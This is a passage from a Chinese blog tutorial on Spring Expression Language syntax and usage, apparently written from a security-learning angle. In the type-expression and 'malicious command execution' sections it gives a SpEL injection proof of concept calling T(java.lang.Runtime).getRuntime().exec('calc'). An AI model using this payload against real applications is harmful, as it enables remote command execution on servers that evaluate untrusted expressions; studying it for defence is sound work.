+<h2 id="SpEL-表达式基础"><a href="#SpEL-表达式基础" class="headerlink" title="SpEL 表达式基础"></a>SpEL 表达式基础</h2><h3 id="SPEL定界符"><a href="#SPEL定界符" class="headerlink" title="SPEL定界符"></a>SPEL定界符</h3><p>在Spring Expression Language（SPEL）中，定界符（Delimiter）用于标识表达式的开始和结束。SPEL的默认定界符是<code>#&#123;&#125;</code>。这意味着当在Spring配置文件或注解中使用SPEL表达式时，需要将表达式放在<code>#&#123;&#125;</code>之间。</p>
+<p>例如，在Spring配置文件中，可以这样使用SPEL表达式：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;exampleBean&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.example.ExampleBean&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;message&quot;</span> <span class="attr">value</span>=<span class="string">&quot;#&#123;systemProperties[&#x27;user.name&#x27;]&#125;&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在这个例子中，<code>#&#123;systemProperties[&#39;user.name&#39;]&#125;</code>是一个SPEL表达式，它从系统属性中获取当前用户的用户名。</p>
+<p>在注解中，SPEL表达式的使用方式类似：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Value(&quot;#&#123;systemProperties[&#x27;user.name&#x27;]&#125;&quot;)</span></span><br><span class="line"><span class="keyword">private</span> String userName;</span><br></pre></td></tr></table></figure>
+
+<p>这里，<code>@Value</code>注解用于注入一个值，而<code>#&#123;systemProperties[&#39;user.name&#39;]&#125;</code>是一个SPEL表达式，用于获取系统属性中的用户名。</p>
+<p>总结来说，SPEL的定界符是<code>#&#123;&#125;</code>，它用于标识表达式的边界，使得Spring能够识别并解析其中的表达式。</p>
+<h3 id="SPEL表达式类型"><a href="#SPEL表达式类型" class="headerlink" title="SPEL表达式类型"></a>SPEL表达式类型</h3><h4 id="字面量表达式"><a href="#字面量表达式" class="headerlink" title="字面量表达式"></a>字面量表达式</h4><p>这些字面量表达式可以直接在 SpEL 中使用，例如在 Spring 的配置文件或注解中：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Value(&quot;#&#123;&#x27;Hello, World!&#x27;&#125;&quot;)</span></span><br><span class="line"><span class="keyword">private</span> String greeting;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Value(&quot;#&#123;42&#125;&quot;)</span></span><br><span class="line"><span class="keyword">private</span> <span class="type">int</span> magicNumber;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Value(&quot;#&#123;3.14&#125;&quot;)</span></span><br><span class="line"><span class="keyword">private</span> <span class="type">double</span> pi;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Value(&quot;#&#123;true&#125;&quot;)</span></span><br><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> isActive;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Value(&quot;#&#123;null&#125;&quot;)</span></span><br><span class="line"><span class="keyword">private</span> Object emptyObject;</span><br></pre></td></tr></table></figure>
+
+<p>通过这些字面量表达式，可以在运行时将这些固定值注入到 Spring 管理的 Bean 中。</p>
+<h4 id="属性表达式"><a href="#属性表达式" class="headerlink" title="属性表达式"></a>属性表达式</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User2</span> &#123;</span><br><span class="line">    <span class="type">int</span> age=<span class="number">17</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> User2 user2=<span class="keyword">new</span> <span class="title class_">User2</span>(<span class="number">18</span>);</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Value(&quot;#&#123;user2.age&#125;&quot;)</span></span><br><span class="line">	<span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line">User&#123;age=<span class="number">17</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="方法表达式"><a href="#方法表达式" class="headerlink" title="方法表达式"></a>方法表达式</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User2</span> &#123;</span><br><span class="line">    <span class="type">int</span> age=<span class="number">17</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">print</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;cmisl&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> User2 user2=<span class="keyword">new</span> <span class="title class_">User2</span>(<span class="number">18</span>);</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Value(&quot;#&#123;user2.print()&#125;&quot;)</span></span><br><span class="line">	<span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line">cmisl</span><br><span class="line">User&#123;age=<span class="number">0</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="操作符表达式"><a href="#操作符表达式" class="headerlink" title="操作符表达式"></a>操作符表达式</h4><ul>
+<li>算术操作符：例如 <code>a + b</code>、<code>c - d</code></li>
+<li>比较操作符：例如 <code>a &gt; b</code>、<code>c == d</code></li>
+<li>逻辑操作符：例如 <code>a and b</code>、<code>c or d</code></li>
+<li>正则表达式：例如 <code>name matches &#39;John.*&#39;</code></li>
+<li>三元操作符：例如 <code>condition ? trueExpression : falseExpression</code></li>
+<li>Elvis 操作符：例如 <code>name ?: &#39;Unknown&#39;</code></li>
+<li>安全导航操作符：例如 <code>user?.name</code>，避免 <code>NullPointerException</code></li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span>&#123;</span><br><span class="line">    <span class="meta">@Value(&quot;#&#123;2&gt;1&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> aBoolean;</span><br><span class="line">&#125;</span><br><span class="line">输出：</span><br><span class="line"><span class="literal">true</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="类型表达式"><a href="#类型表达式" class="headerlink" title="类型表达式"></a>类型表达式</h4><p>在 SpEL 表达式中，使用 <code>T(Type)</code> 运算符会调用类的作用域和方法。换句话说，就是可以通过该类类型表达式来操作类。</p>
+<p>假设我们有一个类 <code>Constants</code>，其中包含一个静态字段 <code>MAX_VALUE</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java复制public class Constants &#123;</span><br><span class="line">    public static final int MAX_VALUE = 100;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们可以使用SpEL来获取这个静态字段的值。在Spring配置中，我们可以这样写：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java复制@Value(&quot;#&#123;T(com.example.Constants).MAX_VALUE&#125;&quot;)</span><br><span class="line">private int maxValue;</span><br></pre></td></tr></table></figure>
+
+<p>在这个例子中：</p>
+<ul>
+<li><code>T(com.example.Constants)</code> 是SpEL的类型表达式，用于引用 <code>Constants</code> 类。</li>
+<li><code>.MAX_VALUE</code> 用于访问 <code>Constants</code> 类中的静态字段 <code>MAX_VALUE</code>。</li>
+</ul>
+<p>这样，<code>maxValue</code> 字段将被注入 <code>Constants.MAX_VALUE</code> 的值，即 <code>100</code>。</p>
+<p>使用 <code>T(Type)</code> 来表示 <code>java.lang.Class</code> 实例，Type 必须是类全限定名，但 <code>”java.lang”</code> 包除外，因为 SpEL 已经内置了该包，即该包下的类可以不指定具体的包名；使用类类型表达式还可以进行访问类静态方法和类静态字段。</p>
+<blockquote>
+<p>这里就有潜在的攻击面了<br>因为我们 <code>java.lang.Runtime</code> 这个包也是包含于 <code>java.lang</code> 的包的，所以如果能调用 <code>Runtime</code><br>就可以进行命令执行</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">ExpressionParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SpelExpressionParser</span>();</span><br><span class="line">     </span><br><span class="line">        <span class="type">String</span> <span class="variable">expression</span> <span class="operator">=</span> <span class="string">&quot;T(java.lang.Runtime).getRuntime().exec(&#x27;calc&#x27;)&quot;</span>;</span><br><span class="line">        Class&lt;Object&gt; result = parser.parseExpression(expression).getValue(Class.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">user</span>&#123;</span><br><span class="line">    <span class="meta">@Value(&quot;#&#123;T(java.lang.Runtime).getRuntime.exec(&#x27;calc&#x27;)&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="SpEL-用法"><a href="#SpEL-用法" class="headerlink" title="SpEL 用法"></a>SpEL 用法</h2><p>Spring Expression Language (SpEL) 是一种强大的表达式语言，支持在运行时查询和操作对象图。SpEL 可以用于多种场景，包括但不限于以下三种主要用法：</p>
+<ol>
+<li><p><strong>在Spring配置文件中使用SpEL</strong>：</p>
+<ul>
+<li>在Spring的XML配置文件或注解中使用SpEL表达式来动态设置Bean的属性值。</li>
+<li>例如，在XML配置文件中：<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;exampleBean&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.example.ExampleBean&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;message&quot;</span> <span class="attr">value</span>=<span class="string">&quot;#&#123;systemProperties[&#x27;user.name&#x27;]&#125;&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
+<li>在注解中：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Value(&quot;#&#123;systemProperties[&#x27;user.name&#x27;]&#125;&quot;)</span></span><br><span class="line"><span class="keyword">private</span> String message;</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p><strong>在Java代码中使用SpEL</strong>：</p>
+<ul>
+<li>在Java代码中通过 <code>ExpressionParser</code> 和 <code>SpelExpressionParser</code> 解析和执行SpEL表达式。</li>
+<li>例如：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.expression.ExpressionParser;</span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.spel.standard.SpelExpressionParser;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpelExample</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">ExpressionParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SpelExpressionParser</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">expression</span> <span class="operator">=</span> <span class="string">&quot;(&#x27;Hello&#x27; + &#x27; World&#x27;).toUpperCase()&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> parser.parseExpression(expression).getValue(String.class);</span><br><span class="line">        System.out.println(result); <span class="comment">// 输出: HELLO WORLD</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p><strong>在Spring Security中使用SpEL</strong>：</p>
+<ul>
+<li>Spring Security 支持使用SpEL来定义安全规则和访问控制。</li>
+<li>例如，在Spring Security配置中：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http</span><br><span class="line">    .authorizeRequests()</span><br><span class="line">        .antMatchers(<span class="string">&quot;/admin/**&quot;</span>).hasRole(<span class="string">&quot;ADMIN&quot;</span>)</span><br><span class="line">        .antMatchers(<span class="string">&quot;/user/**&quot;</span>).access(<span class="string">&quot;hasRole(&#x27;USER&#x27;) and authentication.name == &#x27;user&#x27;&quot;</span>)</span><br><span class="line">        .anyRequest().authenticated()</span><br><span class="line">        .and()</span><br><span class="line">    .formLogin();</span><br></pre></td></tr></table></figure></li>
+<li>在这个例子中，<code>access</code> 方法使用了SpEL表达式来定义访问控制规则。</li>
+</ul>
+</li>
+</ol>
+<p>总结：</p>
+<ul>
+<li>SpEL 可以在Spring配置文件中动态设置属性值。</li>
+<li>SpEL 可以在Java代码中解析和执行表达式。</li>
+<li>SpEL 可以在Spring Security中定义安全规则和访问控制。</li>
+</ul>
+<h3 id="恶意指令执行"><a href="#恶意指令执行" class="headerlink" title="恶意指令执行"></a>恶意指令执行</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> poc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.Expression;</span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.ExpressionParser;</span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.spel.standard.SpelExpressionParser;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 创建一个 SpEL 表达式解析器实例</span></span><br><span class="line">        <span class="type">ExpressionParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SpelExpressionParser</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 定义一个包含 SpEL 表达式的字符串，该表达式将执行系统命令 &#x27;calc&#x27;</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">spel</span> <span class="operator">=</span> <span class="string">&quot;T(java.lang.Runtime).getRuntime().exec(&#x27;calc&#x27;)&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 解析 SpEL 表达式字符串并生成一个 Expression 对象</span></span><br><span class="line">        <span class="type">Expression</span> <span class="variable">expression</span> <span class="operator">=</span> parser.parseExpression(spel);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 计算并输出表达式的值，这将执行系统命令 &#x27;calc&#x27;</span></span><br><span class="line">        System.out.println(expression.getValue());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="创建类实例"><a href="#创建类实例" class="headerlink" title="创建类实例"></a>创建类实例</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.Expression;</span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.ExpressionParser;</span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.spel.standard.SpelExpressionParser;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 定义一个包含 SpEL 表达式的字符串，该表达式将创建一个新的 java.util.Date 对象</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">spel</span> <span class="operator">=</span> <span class="string">&quot;new java.util.Date()&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建一个 SpEL 表达式解析器实例</span></span><br><span class="line">        <span class="type">ExpressionParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SpelExpressionParser</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 解析 SpEL 表达式字符串并生成一个 Expression 对象</span></span><br><span class="line">        <span class="type">Expression</span> <span class="variable">expression</span> <span class="operator">=</span> parser.parseExpression(spel);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 计算并输出表达式的值，这将输出当前的日期和时间</span></span><br><span class="line">        System.out.println(expression.getValue());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="SpEL运算"><a href="#SpEL运算" class="headerlink" title="SpEL运算"></a>SpEL运算</h3><h4 id="基本运算"><a href="#基本运算" class="headerlink" title="基本运算"></a>基本运算</h4><table>
+<thead>
+<tr>
+<th>运算符类型</th>
+<th>运算符</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>算数运算</td>
+<td>+, -, *, &#x2F;, %, ^</td>
+</tr>
+<tr>
+<td>关系运算</td>
+<td>&lt;, &gt;, &#x3D;&#x3D;, &lt;&#x3D;, &gt;&#x3D;, lt, gt, eq, le, ge</td>
+</tr>
+<tr>
+<td>逻辑运算</td>
+<td>and, or, not, !</td>
+</tr>
+<tr>
+<td>条件运算</td>
+<td>?:(ternary), ?:(Elvis)</td>
+</tr>
+<tr>
+<td>正则表达式</td>
+<td>matches</td>
+</tr>
+</tbody></table>
+<p>以下是使用 SpEL 表达式 <code>#&#123;&#125;</code> 的形式来表示各种运算的示例：</p>
+<h5 id="算数运算"><a href="#算数运算" class="headerlink" title="算数运算"></a>算数运算</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#&#123;<span class="number">1</span> + <span class="number">2</span>&#125; <span class="comment">// 加法</span></span><br><span class="line">#&#123;<span class="number">3</span> - <span class="number">1</span>&#125; <span class="comment">// 减法</span></span><br><span class="line">#&#123;<span class="number">2</span> * <span class="number">3</span>&#125; <span class="comment">// 乘法</span></span><br><span class="line">#&#123;<span class="number">6</span> / <span class="number">2</span>&#125; <span class="comment">// 除法</span></span><br><span class="line">#&#123;<span class="number">5</span> % <span class="number">2</span>&#125; <span class="comment">// 取模</span></span><br><span class="line">#&#123;<span class="number">2</span> ^ <span class="number">3</span>&#125; <span class="comment">// 幂运算</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="关系运算"><a href="#关系运算" class="headerlink" title="关系运算"></a>关系运算</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#&#123;<span class="number">3</span> &lt; <span class="number">5</span>&#125; <span class="comment">// 小于</span></span><br><span class="line">#&#123;<span class="number">5</span> &gt; <span class="number">3</span>&#125; <span class="comment">// 大于</span></span><br><span class="line">#&#123;<span class="number">3</span> == <span class="number">3</span>&#125; <span class="comment">// 等于</span></span><br><span class="line">#&#123;<span class="number">3</span> &lt;= <span class="number">3</span>&#125; <span class="comment">// 小于等于</span></span><br><span class="line">#&#123;<span class="number">5</span> &gt;= <span class="number">5</span>&#125; <span class="comment">// 大于等于</span></span><br><span class="line">#&#123;<span class="number">3</span> lt <span class="number">5</span>&#125; <span class="comment">// 小于 (同 &lt;)</span></span><br><span class="line">#&#123;<span class="number">5</span> gt <span class="number">3</span>&#125; <span class="comment">// 大于 (同 &gt;)</span></span><br><span class="line">#&#123;<span class="number">3</span> eq <span class="number">3</span>&#125; <span class="comment">// 等于 (同 ==)</span></span><br><span class="line">#&#123;<span class="number">3</span> le <span class="number">3</span>&#125; <span class="comment">// 小于等于 (同 &lt;=)</span></span><br><span class="line">#&#123;<span class="number">5</span> ge <span class="number">5</span>&#125; <span class="comment">// 大于等于 (同 &gt;=)</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="逻辑运算"><a href="#逻辑运算" class="headerlink" title="逻辑运算"></a>逻辑运算</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#&#123;<span class="literal">true</span> and <span class="literal">false</span>&#125; <span class="comment">// 逻辑与</span></span><br><span class="line">#&#123;<span class="literal">true</span> or <span class="literal">false</span>&#125; <span class="comment">// 逻辑或</span></span><br><span class="line">#&#123;not <span class="literal">true</span>&#125; <span class="comment">// 逻辑非</span></span><br><span class="line">#&#123;!<span class="literal">false</span>&#125; <span class="comment">// 逻辑非 (同 not)</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="条件运算"><a href="#条件运算" class="headerlink" title="条件运算"></a>条件运算</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#&#123;<span class="number">2</span> &gt; <span class="number">1</span> ? <span class="string">&#x27;yes&#x27;</span> : <span class="string">&#x27;no&#x27;</span>&#125; <span class="comment">// 三元运算符</span></span><br><span class="line">#&#123;name ?: <span class="string">&#x27;default&#x27;</span>&#125; <span class="comment">// Elvis 运算符</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&#123;<span class="string">&#x27;hello&#x27;</span> matches <span class="string">&#x27;h.*o&#x27;</span>&#125; <span class="comment">// 正则表达式匹配</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="集合操作"><a href="#集合操作" class="headerlink" title="集合操作"></a>集合操作</h4><h5 id="1-访问集合元素"><a href="#1-访问集合元素" class="headerlink" title="1. 访问集合元素"></a>1. 访问集合元素</h5><p>可以使用索引来访问列表或数组中的元素。例如：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">List&lt;String&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">list.add(<span class="string">&quot;apple&quot;</span>);</span><br><span class="line">list.add(<span class="string">&quot;banana&quot;</span>);</span><br><span class="line">list.add(<span class="string">&quot;cherry&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">fruit</span> <span class="operator">=</span> parser.parseExpression(<span class="string">&quot;#list[1]&quot;</span>).getValue(context, list);</span><br><span class="line"><span class="comment">// fruit = &quot;banana&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="2-映射操作"><a href="#2-映射操作" class="headerlink" title="2. 映射操作"></a>2. 映射操作</h5><p>可以使用键来访问映射中的值。例如：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;String, String&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">map.put(<span class="string">&quot;fruit1&quot;</span>, <span class="string">&quot;apple&quot;</span>);</span><br><span class="line">map.put(<span class="string">&quot;fruit2&quot;</span>, <span class="string">&quot;banana&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">fruit</span> <span class="operator">=</span> parser.parseExpression(<span class="string">&quot;#map[&#x27;fruit2&#x27;]&quot;</span>).getValue(context, map);</span><br><span class="line"><span class="comment">// fruit = &quot;banana&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="3-集合过滤"><a href="#3-集合过滤" class="headerlink" title="3. 集合过滤"></a>3. 集合过滤</h5><p>可以使用 <code>?[]</code> 运算符来过滤集合中的元素。例如：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">List&lt;Integer&gt; numbers = Arrays.asList(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">List&lt;Integer&gt; evenNumbers = (List&lt;Integer&gt;) parser.parseExpression(<span class="string">&quot;#numbers.?[#this % 2 == 0]&quot;</span>).getValue(context, numbers);</span><br><span class="line"><span class="comment">// evenNumbers = [2, 4]</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="4-集合投影"><a href="#4-集合投影" class="headerlink" title="4. 集合投影"></a>4. 集合投影</h5><p>可以使用 <code>![]</code> 运算符来选择集合中的特定属性。例如：</p>
